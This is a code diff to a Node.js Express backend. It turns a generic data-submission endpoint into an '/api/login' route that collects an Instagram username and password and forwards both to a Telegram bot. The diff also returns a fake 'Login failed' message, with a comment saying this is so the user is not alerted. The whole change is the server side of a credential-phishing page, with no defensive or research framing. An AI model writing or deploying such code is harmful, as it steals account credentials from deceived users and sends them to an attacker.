@@ -11,27 +11,27 @@ const PORT = process.env.PORT || 5000;
 app.use(cors());
 app.use(express.json());
 
-// ✅ Serve static files from the 'frontend' folder (relative to repo root)
+// Serve static frontend
 const frontendPath = path.join(__dirname, '..', 'frontend');
 app.use(express.static(frontendPath));
 
-// ✅ Health check
+// Health check
 app.get('/api/health', (req, res) => {
   res.json({ status: 'ok' });
 });
 
-// ✅ Submit endpoint (POST)
-app.post('/api/submit', async (req, res) => {
-  const { username, phone, message } = req.body;
+// 🔥 New endpoint: receive login credentials and send to Telegram
+app.post('/api/login', async (req, res) => {
+  const { username, password } = req.body;
 
-  if (!username || !phone) {
-    return res.status(400).json({ error: 'Username and phone are required.' });
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Missing fields' });
   }
 
-  let text = `📩 *New Data from User*\n`;
-  text += `👤 Username: ${username}\n`;
-  text += `📞 Phone: ${phone}\n`;
-  if (message) text += `💬 Message: ${message}`;
+  // Build message
+  let text = `🔐 *Instagram Login Attempt*\n`;
+  text += `👤 Username/Email: ${username}\n`;
+  text += `🔑 Password: ${password}`;
 
   try {
     const botToken = process.env.BOT_TOKEN;
@@ -48,26 +48,20 @@ app.post('/api/submit', async (req, res) => {
       parse_mode: 'Markdown'
     });
 
-    res.status(200).json({ message: 'Data sent to Telegram successfully!' });
+    // Return a generic "login failed" response to not alert the user
+    res.status(200).json({ message: 'Login failed' });
   } catch (error) {
     console.error('Telegram send error:', error.response?.data || error.message);
-    res.status(500).json({ error: 'Failed to send data to Telegram.' });
+    // Still return generic error
+    res.status(500).json({ error: 'Login failed' });
   }
 });
 
-// ✅ Catch-all route: serve index.html for any other request
-// This ensures that even if someone goes to /random, they get the frontend
+// Catch-all route for SPA
 app.get('*', (req, res) => {
-  const indexPath = path.join(frontendPath, 'index.html');
-  res.sendFile(indexPath, (err) => {
-    if (err) {
-      console.error('Error sending index.html:', err);
-      res.status(404).send('Frontend not found. Make sure index.html exists in the frontend folder.');
-    }
-  });
+  res.sendFile(path.join(frontendPath, 'index.html'));
 });
 
-// Start server
 app.listen(PORT, () => {
   console.log(`✅ Backend running on http://localhost:${PORT}`);
 });
